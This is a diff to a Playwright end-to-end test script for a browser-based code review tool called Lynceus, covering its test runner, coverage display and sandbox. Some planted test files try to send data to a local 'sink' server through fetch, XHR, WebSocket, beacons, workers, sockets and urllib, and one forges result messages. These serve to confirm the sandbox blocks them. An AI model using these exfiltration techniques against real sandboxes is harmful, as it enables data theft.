@@ -1,4 +1,4 @@
-// Lynceus Phase 1 end-to-end checks against the production build.
+// Lynceus end-to-end checks (Phases 1-3) against the production build.
 // Usage: npm run build && npm run e2e      (needs Playwright + Chromium installed)
 import { createRequire } from 'module';
 import http from 'http';
@@ -25,6 +25,13 @@ function serve() {
   });
   return new Promise((r) => s.listen(PORT, '127.0.0.1', () => r(s)));
 }
+
+// A "sink" on another origin: any connection reaching it means user code got data out.
+const SINK_PORT = 4174, SINK = `http://127.0.0.1:${SINK_PORT}/`;
+let sinkHits = 0;
+const sink = http.createServer((req, res) => { res.writeHead(200, { 'Access-Control-Allow-Origin': '*' }); res.end('ok'); });
+sink.on('connection', () => { sinkHits++; });
+await new Promise((r) => sink.listen(SINK_PORT, '127.0.0.1', r));
 
 const results = [];
 const check = (name, pass, detail = '') => { results.push({ name, pass, detail }); console.log(`${pass ? 'PASS' : 'FAIL'}  ${name}${detail && !pass ? '  -> ' + detail : ''}`); };
@@ -201,6 +208,115 @@ try {
   const pyCached = await page.evaluate(async () => (await caches.keys()).some((k) => k.startsWith('lynceus-pyodide-')));
   check('Pyodide stored by the service worker after first use', pyCached);
 
+
+  // ================= Phase 3: sandbox, test runner, per-test coverage =================
+  const file = (name, text) => ({ name, mimeType: 'text/plain', buffer: Buffer.from(text) });
+  async function runProject(files, { width = 1000, timeout } = {}) {
+    const p = await ctx.newPage();
+    if (width !== 1000) await p.setViewportSize({ width, height: 800 });
+    await p.goto(APP);
+    await p.getByTestId('file-input').setInputFiles(files);
+    await p.getByRole('button', { name: 'Review this code' }).click();
+    const nav = width >= 760 ? p.locator('nav.inline') : p.locator('nav.tabbar:not(.inline)');
+    await nav.getByRole('button', { name: 'Tests' }).click();
+    if (timeout) { await p.locator('.limits summary').click(); await p.getByTestId('test-timeout').fill(String(timeout)); await p.getByTestId('test-timeout').dispatchEvent('change'); }
+    await p.getByRole('button', { name: /^Run tests/ }).click();
+    await p.getByTestId('test-summary').waitFor({ timeout: 120000 });
+    const res = {};
+    for (const li of await p.getByTestId('result').all()) res[(await li.locator('.name').innerText()).trim()] = { outcome: await li.getAttribute('data-outcome'), text: await li.innerText() };
+    return { p, res, nav };
+  }
+  const JS_CALC = "export function sign(n) {\n  if (n < 0) {\n    return -1;\n  }\n  return 1;\n}\nexport const twice = (x) => x * 2;\n";
+  const JS_TEST = "import { sign, twice } from './calc.js';\ndescribe('calc', () => {\n  test('sign of 5', () => { expect(sign(5)).toBe(1); });\n  test('twice is wrong', () => { expect(twice(2)).toBe(5); });\n  test('reads a file', () => { require('fs').readFileSync('x'); });\n});\n";
+  {
+    const { p, res, nav } = await runProject([file('src/calc.js', JS_CALC), file('src/calc.test.js', JS_TEST)]);
+    check('JS tests: pass reported', res['calc › sign of 5']?.outcome === 'passed', JSON.stringify(res));
+    check('JS tests: failure shows the assertion message', res['calc › twice is wrong']?.outcome === 'failed' && /Expected: 5[\s\S]*Received: 4/.test(res['calc › twice is wrong'].text));
+    check('JS tests: Node built-in fails that one test with a clear reason', res['calc › reads a file']?.outcome === 'error' && /Node built-in "fs" isn't available/.test(res['calc › reads a file'].text));
+    await p.getByRole('button', { name: 'src/calc.js', exact: true }).first().click();
+    await p.locator('[data-line="3"]').waitFor();
+    check('coverage: untested line is dimmed and labelled "not run by the provided tests"', (await p.locator('[data-line="3"]').getAttribute('class')).includes('cov-miss') && (await p.locator('[data-line="3"] .nr-tag').innerText()).includes('not run by the provided tests'));
+    check('coverage: never calls untested code "dead"', !/\bdead\b/i.test(await p.locator('.code').innerText()));
+    await p.locator('[data-line="5"]').click();
+    check('tap a covered line: lists the tests that ran it', /Run by 1 test[\s\S]*calc › sign of 5/.test(await p.getByTestId('line-tests').first().innerText()));
+    await p.getByTestId('coverage-toggle').click();
+    check('coverage layer can be switched off', (await p.locator('.cov-miss').count()) === 0);
+    await p.close();
+  }
+  const PY_CALC = "def sign(n):\n    if n < 0:\n        return -1\n    return 1\n";
+  const PY_TEST = "from calc import sign\n\ndef test_positive():\n    assert sign(5) == 1\n\ndef test_wrong():\n    assert sign(2) == 7\n";
+  {
+    const { p, res } = await runProject([file('calc.py', PY_CALC), file('test_calc.py', PY_TEST)]);
+    check('Python tests: pytest pass and fail with assertion text', res['test_positive']?.outcome === 'passed' && res['test_wrong']?.outcome === 'failed' && /assert 1 == 7/.test(res['test_wrong'].text), JSON.stringify(res).slice(0, 400));
+    await p.getByRole('button', { name: 'calc.py', exact: true }).first().click();
+    await p.locator('[data-line="3"]').waitFor();
+    check('Python coverage: untested return is dimmed and labelled', (await p.locator('[data-line="3"]').getAttribute('class')).includes('cov-miss'));
+    await p.locator('[data-line="4"]').click();
+    check('Python coverage: line shows the exact tests that ran it', /Run by 2 tests/.test(await p.getByTestId('line-tests').first().innerText()));
+    await p.close();
+  }
+  {
+    const before = sinkHits;
+    const EXFIL_JS = [
+      `test('fetch', async () => { await fetch('${SINK}a'); });`,
+      `test('xhr', () => { const x = new XMLHttpRequest(); x.open('GET', '${SINK}b'); x.send(); });`,
+      `test('websocket', () => { new WebSocket('ws://127.0.0.1:${SINK_PORT}/'); });`,
+      `test('eventsource', () => { new EventSource('${SINK}c'); });`,
+      `test('beacon', () => { navigator.sendBeacon('${SINK}d', 'x'); });`,
+      `test('nested worker', () => { new Worker('${SINK}e.js'); });`,
+      `test('importScripts', () => { importScripts('${SINK}f.js'); });`,
+      `test('prototype fetch', async () => { const f = Object.getPrototypeOf(Object.getPrototypeOf(self)).fetch; await f.call(self, '${SINK}g'); });`,
+      `test('fake result via postMessage', () => { self.postMessage({ type: 'result', result: { id: 'x', outcome: 'passed' } }); });`,
+    ].join('\n');
+    const { p, res } = await runProject([file('exfil.test.js', EXFIL_JS)]);
+    const names = ['fetch', 'xhr', 'websocket', 'eventsource', 'beacon', 'nested worker', 'importScripts', 'prototype fetch'];
+    const bad = names.filter((n) => !(res[n] && res[n].outcome === 'failed' && /network blocked by Lynceus/.test(res[n].text)));
+    check('planted JS exfiltration tests all fail loudly ("network blocked by Lynceus")', bad.length === 0, bad.map((n) => `${n}: ${JSON.stringify(res[n])}`).join(' | '));
+    check('JS user code cannot post fake results to the page', res['fake result via postMessage']?.outcome === 'failed' && /reserved by Lynceus/.test(res['fake result via postMessage'].text));
+    await p.close();
+    const EXFIL_PY = [
+      'import pytest', '',
+      'def test_js():\n    import js\n    js.fetch("' + SINK + 'h")\n',
+      'def test_pyodide_http():\n    from pyodide.http import pyfetch\n',
+      'def test_micropip():\n    import micropip\n',
+      'def test_socket():\n    import socket\n    socket.create_connection(("127.0.0.1", ' + SINK_PORT + '))\n',
+      'def test_urllib():\n    import urllib.request\n    urllib.request.urlopen("' + SINK + 'i")\n',
+      'def test_http_client():\n    import http.client\n    c = http.client.HTTPConnection("127.0.0.1", ' + SINK_PORT + ')\n    c.request("GET", "/j")\n',
+    ].join('\n');
+    const r2 = await runProject([file('test_exfil.py', EXFIL_PY)]);
+    const pyBad = ['test_js', 'test_pyodide_http', 'test_micropip', 'test_socket', 'test_urllib', 'test_http_client'].filter((n) => !(r2.res[n] && r2.res[n].outcome === 'failed' && /network blocked by Lynceus/.test(r2.res[n].text)));
+    check('planted Python exfiltration tests all fail loudly', pyBad.length === 0, pyBad.map((n) => `${n}: ${JSON.stringify(r2.res[n])?.slice(0, 200)}`).join(' | '));
+    await r2.p.close();
+    check('zero connections reached the sink during exfiltration tests', sinkHits === before, `${sinkHits - before} hits`);
+  }
+  {
+    const { p, res } = await runProject([file('loop.test.js', "test('spins forever', () => { while (true) {} });\ntest('runs after', () => { expect(1 + 1).toBe(2); });\n")], { timeout: 2 });
+    check('JS infinite loop: stopped at the limit and reported by name', res['spins forever']?.outcome === 'timeout' && /Stopped after 2 s/.test(res['spins forever'].text), JSON.stringify(res));
+    check('JS: the other tests still ran in a fresh sandbox', res['runs after']?.outcome === 'passed');
+    await p.close();
+    const r2 = await runProject([file('test_loop.py', "def test_spins():\n    while True:\n        pass\n\ndef test_ok():\n    assert True\n")], { timeout: 3 });
+    check('Python infinite loop: stopped and reported by name; others still ran', r2.res['test_spins']?.outcome === 'timeout' && r2.res['test_ok']?.outcome === 'passed', JSON.stringify(r2.res));
+    await r2.p.close();
+    // restore the default limit for later checks
+    const p3 = await ctx.newPage(); await p3.goto(APP); await p3.evaluate(() => { const s = JSON.parse(localStorage.getItem('lynceus.settings')); s.testTimeoutSec = 10; localStorage.setItem('lynceus.settings', JSON.stringify(s)); }); await p3.close();
+  }
+  {
+    const p = await ctx.newPage();
+    await p.goto(APP);
+    await p.locator('#paste').fill(JS_SRC);
+    await p.getByRole('button', { name: 'Review this code' }).click();
+    await p.locator('nav.inline').getByRole('button', { name: 'Tests' }).click();
+    check('no tests: says so plainly and turns coverage off', /No tests found/.test(await p.getByTestId('no-tests').innerText()));
+    await p.close();
+  }
+  {
+    const { p } = await runProject([file('src/calc.js', JS_CALC), file('src/calc.test.js', JS_TEST)], { width: 360 });
+    const over = await p.evaluate(() => document.documentElement.scrollWidth - window.innerWidth);
+    check('phone: Tests tab with results has no horizontal scroll', over <= 0, `${over}px`);
+    await p.screenshot({ path: path.join(ROOT, '..', 'tests', 'e2e', 'phone-tests.png'), fullPage: true });
+    await p.close();
+  }
+
   // phone: bottom sheet
   {
     const p = await ctx.newPage();
@@ -249,6 +365,19 @@ try {
   await page.locator('nav.inline').getByRole('button', { name: 'Code' }).click();
   await page.getByTestId('file-select').waitFor({ timeout: 60000 }).catch(() => {});
   check('Python analysis works offline (no consent prompt the second time)', (await page.getByRole('button', { name: 'Download Python support' }).count()) === 0 && (await page.locator('[data-line="8"] .letter').count()) === 1);
+  // Python TESTS offline too (Pyodide + wheels from the service-worker cache)
+  {
+    const p = await ctx.newPage();
+    await p.goto(APP);
+    await p.getByTestId('file-input').setInputFiles([file('calc.py', PY_CALC), file('test_calc.py', PY_TEST)]);
+    await p.getByRole('button', { name: 'Review this code' }).click();
+    await p.locator('nav.inline').getByRole('button', { name: 'Tests' }).click();
+    await p.getByRole('button', { name: /^Run tests/ }).click();
+    await p.getByTestId('test-summary').waitFor({ timeout: 120000 }).catch(() => {});
+    const txt = await p.locator('main').innerText();
+    check('Python tests run offline after first use', /1 passed/.test(txt) && /1 failed/.test(txt), txt.slice(0, 300));
+    await p.close();
+  }
   await ctx.setOffline(false);
 
   check('no CSP violations (pages and workers)', cspViolations.length === 0, cspViolations.join(' | '));
@@ -261,6 +390,7 @@ try {
 } finally {
   await browser.close();
   server.close?.();
+  sink.close();
 }
 const failed = results.filter((r) => !r.pass);
 console.log(`\n${results.length - failed.length}/${results.length} passed`);
